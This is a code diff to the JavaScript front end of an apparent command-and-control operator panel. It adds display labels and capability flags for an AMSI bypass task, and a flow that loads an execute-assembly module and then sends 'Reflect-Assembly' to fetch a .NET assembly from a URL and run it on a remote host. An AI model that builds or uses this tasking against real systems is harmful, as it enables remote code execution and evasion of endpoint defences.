@@ -60,6 +60,22 @@ function populateCollapse(tableData) {
     //tableData.sort(sort_by(tableData.task, true));
     for (let data in tableData.task) {
         let value = tableData.task[data];
+        command_display = null
+        if (value.commandType == 'amsi-rasta-custom'){
+            command_display = "Amsi Bypass"
+            if (value.commandResponse == 'True'){
+                document.getElementById("amsi-bypass-capability").style.display = "block"
+            }
+        }
+        else if (value.commandType == 'load-execute-assembly'){
+            command_display = "Load Execute Assembly Module"
+            if (value.commandResponse != undefined){
+                document.getElementById("execute-assembly-capability").style.display = "block"
+            }
+        }
+        else {
+            command_display = value.command
+        }
 
         //does element already exist
         var dataElement = document.getElementById(data);
@@ -98,7 +114,7 @@ function populateCollapse(tableData) {
             timeRequested.innerHTML = "[ " + epoch2human(basicHTMLEncode(data)) + " ]$ ";
             summaryParent.appendChild(timeRequested);
             var command = document.createElement('span')
-            command.innerHTML = basicHTMLEncode(value.command);
+            command.innerHTML = basicHTMLEncode(command_display);
             command.className = "text-secondary"
             command.id = "waiting-task"
             summaryParent.appendChild(command);            
@@ -123,7 +139,7 @@ function populateCollapse(tableData) {
             timeRequested.innerHTML = "[ " + epoch2human(basicHTMLEncode(data)) + " ]$ ";
             summaryParent.appendChild(timeRequested);
             var command = document.createElement('span')
-            command.innerHTML = basicHTMLEncode(value.command);
+            command.innerHTML = basicHTMLEncode(command_display);
             command.className ="text-success"
             summaryParent.appendChild(command);
 
@@ -201,15 +217,24 @@ function sendTaskHandler(){
         sendTask("amsi-rasta-custom");
     }
     else if (taskSelection.value == "execute-assembly") {
-        sendTask("execute-assembly");
-        var url = document.getElementById("assembly-url").value;
-        var arguments = document.getElementById("assembly-arguments").value;
-        if (arguments == "") {
-            sendTask("Reflect-Assembly -url " + url);
+        function sendReflectAssembly(){
+            var url = document.getElementById("assembly-url").value;
+            var arguments = document.getElementById("assembly-arguments").value;
+            if (arguments == "") {
+                sendTask("Reflect-Assembly -url " + url);
+            }
+            else {
+                sendTask("Reflect-Assembly -Url " + url + " -Arguments '" + arguments + "'");
+            }
+        }
+        if (document.getElementById("execute-assembly-capability").style.display != "block") {
+            sendTask("load-execute-assembly");
+            setTimeout(sendReflectAssembly, 2000);
         }
         else {
-            sendTask("Reflect-Assembly -Url " + url + " -Arguments '" + arguments + "'");
+            sendReflectAssembly();
         }
+
     }
 }
 
